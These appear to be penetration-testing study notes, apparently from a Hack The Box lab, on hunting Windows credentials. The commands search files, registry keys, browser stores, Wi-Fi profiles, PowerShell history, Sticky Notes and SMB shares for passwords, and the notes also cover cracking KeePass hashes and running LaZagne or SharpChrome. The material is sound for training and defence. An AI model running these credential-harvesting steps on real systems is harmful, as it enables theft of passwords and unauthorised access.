
## Table of Contents:

- [[#Manual Hunting]]
- [[#PowerShell Credentials]]
- [[#Cmdkey Saved Credentials]]
- [[#Saved Browser Credentials]]
- [[#Password Managers]]
- [[#Automated Tools]]
- [[#Hunting From Linux]]
- [[#Clear-Text Password Storage in the Registry]]
- [[#Sticky Notes Passwords]]
- [[#Other Interesting Files]]
- [[#Email]]

---

## Manual Hunting

Sensitive IIS information such as credentials may be stored in a `web.config` file. For the default IIS website, this could be located at `C:\inetpub\wwwroot\web.config`.

```PowerShell
C:\htb> dir /R
### shows hidden files 

C:\htb> cd c:\Users\htb-student\Documents & findstr /SI /M "password" *.xml *.ini *.txt *.config *.cfg *.env *.xlsx *.ps1 *.bat
### Search File Contents for String - Example 1

C:\htb> findstr /si password *.xml *.ini *.txt *.config *.cfg *.xlsx *.ps1 *.bat
### Search File Contents for String - Example 2

C:\htb> findstr /spin "password" *.*
### Search File Contents for String - Example 3

PS C:\htb> select-string -Path C:\Users\htb-student\Documents\*.txt -Pattern password
### Search File Contents with PowerShell

C:\htb> dir /S /B *pass*.txt == *pass*.xml == *pass*.ini == *cred* == *vnc* == *.config*
### Search for File Extensions - Example 1

C:\htb> where /R C:\ *.config
### Search for File - Example 2

PS C:\htb> Get-ChildItem C:\ -Recurse -Include *.kdbx, * *.rdp, *.config, *.vnc, *.cred -ErrorAction Ignore
### Search for File Extensions Using PowerShell

PS C:\htb> findstr /SIM /C:"password" ".txt" ".ini" ".cfg" ".config" ".xml"
### Application Configuration Files 

PS C:\htb> gc 'C:\Users\htb-student\AppData\Local\Google\Chrome\User Data\Default\Custom Dictionary.txt' | Select-String password
### Chrome Dictionary Files

PS C:\htb> (Get-PSReadLineOption).HistorySavePath
### Looking for PowerShell history file location

PS C:\htb> gc (Get-PSReadLineOption).HistorySavePath
### Reading the PowerShell history file

C:\htb> netsh wlan show profile
### Viewing saved wireless networks

C:\htb> netsh wlan show profile ilfreight_corp key=clear
### Rerieving saved wireless passwords
```

---

## PowerShell Credentials

The credentials are protected using [DPAPI](https://en.wikipedia.org/wiki/Data_Protection_API), which typically means they can only be decrypted by the same user on the same computer they were created on. Refer [[SAM, SYSTEM and SECURITY Dump#DPAPI|DPAPI]]
### Example Script

```PowerShell
# Connect-VC.ps1
# Get-Credential | Export-Clixml -Path 'C:\scripts\pass.xml'
$encryptedPassword = Import-Clixml -Path 'C:\scripts\pass.xml'
$decryptedPassword = $encryptedPassword.GetNetworkCredential().Password
Connect-VIServer -Server 'VC-01' -User 'bob_adm' -Password $decryptedPassword
```

### Decrypting PowerShell Credentials

If we have gained command execution in the context of this user or can abuse DPAPI, then we can recover the cleartext credentials from `pass.xml`.

```PowerShell
PS C:\htb> $credential = Import-Clixml -Path 'C:\scripts\pass.xml'
PS C:\htb> $credential.GetNetworkCredential().username
PS C:\htb> $credential.GetNetworkCredential().password
```

---

## Cmdkey Saved Credentials

The [cmdkey](https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/cmdkey) can be used to create, list, and delete stored usernames and passwords. [SharpChrome](https://github.com/GhostPack/SharpDPAPI) can retrieve cookies and saved logins from Chrome.

```PowerShell
C:\htb> cmdkey /list
### Listing saved creds

PS C:\htb> runas /savecred /user:inlanefreight\bob "COMMAND HERE"
### Running commads in context of another using using saved creds
```

---

## Saved Browser Credentials

[Credentials from web browsers](https://viperone.gitbook.io/pentest-everything/everything/everything-active-directory/credential-access/credentials-from-password-stores/credentials-from-web-browsers)

``` PowerShell
PS C:\htb> .\SharpChrome.exe logins /unprotect
### Retrieving cookies and saved logins from Chrome
```

```Note
Credential collection from Chromium-based browsers typically generates additional events that could be logged and identified by the blue team such as `4688` (process creation) and `16385` (DPAPI activity); defenders may also consider filesystem/object access events such as `4662` (object access) and `4663` (file access) to improve detection fidelity.
```

---

## Password Managers

There are many different password managers like `Keypass`, `iPassword` and vaults such as `Thycotic` and `CyberArk` etc. If we find a `.kbdx` file then we know there is a  KeyPass which is usually secured by a master password which we can extract the hash from and crack locally using `keypass2john` and `Hashcat` .

```shell
> keepass2john ILFREIGHT_Help_Desk.kdbx
> hashcat -m 13400 keepass_hash rockyou.txt
```

---

## Email

If we gain access to a domain-joined system in the context of a domain user with a Microsoft Exchange inbox, we can attempt to search the user's email for terms such as "pass," "creds," "credentials," etc. using the tool [MailSniper](https://github.com/dafthack/MailSniper).

---

## Automated Tools

```PowerShell
PS C:\htb> .\lazagne.exe all

PS C:\htb> Snaffler.exe -s
### `-U`: Retrieve a list of users from AD and search for ref to them
### `-i` & `-n`: Allow to specify which shares should be included in search 

PS C:\htb> Import-Module .\SessionGopher.ps1
PS C:\htb> Invoke-SessionGopher -Target WINLPE-SRV01
### extracts PuTTY, WinSCP, FileZilla, SuperPuTTY, and RDP creds

PS C:\htb> Invoke-HuntSMBShares -Threads 100 -OutputDirectory c:\Users\Public
### runnig PowerHuntShares
```

[LaZagne](https://github.com/AlessandroZ/LaZagne) searches all files for common and any credentials available.

[Snaffler](https://github.com/SnaffCon/Snaffler) automatically identifies accessible network shares and searches for interesting files. 

[SessionGopher](https://github.com/Arvanaghi/SessionGopher) It can also be run to search drives for PuTTY private key files (.ppk), Remote Desktop (.rdp), and RSA (.sdtid) files. We need local admin access to retrieve stored session information for every user in `HKEY_USERS`.

[PowerHuntShares](https://github.com/NetSPI/PowerHuntShares) creates a HTML report on completion.

---

## Hunting From Linux

```shell
> docker run --rm -v ./manspider:/root/.manspider blacklanternsecurity/manspider 10.129.234.121 -c 'passw' -u 'mendres' -p 'Inlanefreight2025!'
  ### MANSPIDER scan for files containing 'passw'

> nxc smb 10.129.234.121 -u jbader -p 'ILovePower333###' --spider Marketing --content --pattern "passw"
  ### enumerate network shares with --spider
```

[MANSPIDER](https://github.com/blacklanternsecurity/MANSPIDER) allow us to scan SMB shares from Linux.

---

## Clear-Text Password Storage in the Registry

Windows [Autologon](https://learn.microsoft.com/en-us/troubleshoot/windows-server/user-profiles-and-logon/turn-on-automatic-logon) is a feature that allows a user to configure their Windows operating system to automatically log on to a specific user account, once this is configured, the username and password are stored in the registry, in clear-text at:

`HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon`

``` PowerShell
C:\htb>reg query "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon"
### AutoLogon

PS C:\htb> reg query HKEY_CURRENT_USER\SOFTWARE\SimonTatham\PuTTY\Sessions
### Enum PUTTY sessions, Need the same user or administrator privs to read HKCU

PS C:\htb> reg query HKEY_CURRENT_USER\SOFTWARE\SimonTatham\PuTTY\Sessions\kali%20s
### Reading session's credentials
```

```Note
We should configure Autologin with Autologon.exe from the Sysinternals suite, which will encrypt the password as an LSA secret.
```

---

## Sticky Notes Passwords

It is a database file and is located at: `C:\Users\<user>\AppData\Local\Packages\Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe\LocalState\plum.sqlite`.

We can copy the three `plum.sqlite*` files down to our system and open them with a tool such as [DB Browser for SQLite](https://sqlitebrowser.org/dl/) and view the `Text` column in the `Note` table with the query `select Text from Note;`.

#### Viewing Sticky Notes Data Using PowerShell

This can also be done with PowerShell using the [PSSQLite module](https://github.com/RamblingCookieMonster/PSSQLite). 

```PowerShell
PS C:\htb> Set-ExecutionPolicy Bypass -Scope Process
PS C:\htb> cd .\PSSQLite\
PS C:\htb> Import-Module .\PSSQLite.psd1
PS C:\htb> $db = 'C:\Users\htb-student\AppData\Local\Packages\Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe\LocalState\plum.sqlite'
PS C:\htb> Invoke-SqliteQuery -Database $db -Query "SELECT Text FROM Note" | ft -wrap
```

We can copy the `.sqlite` file on our attack machine remotely via WinRM.

```shell
> strings plum.sqlite-wal
### We can directly run string on the plum* files and read the data
```
---

## Other Interesting Files

```PowerShell
%SYSTEMDRIVE%\pagefile.sys
%WINDIR%\debug\NetSetup.log
%WINDIR%\repair\sam
%WINDIR%\repair\system
%WINDIR%\repair\software, %WINDIR%\repair\security
%WINDIR%\iis6.log
%WINDIR%\system32\config\AppEvent.Evt
%WINDIR%\system32\config\SecEvent.Evt
%WINDIR%\system32\config\default.sav
%WINDIR%\system32\config\security.sav
%WINDIR%\system32\config\software.sav
%WINDIR%\system32\config\system.sav
%WINDIR%\system32\CCM\logs\*.log
%USERPROFILE%\ntuser.dat
%USERPROFILE%\LocalS~1\Tempor~1\Content.IE5\index.dat
%WINDIR%\System32\drivers\etc\hosts
C:\ProgramData\Configs\*
C:\Program Files\Windows PowerShell\*
```

---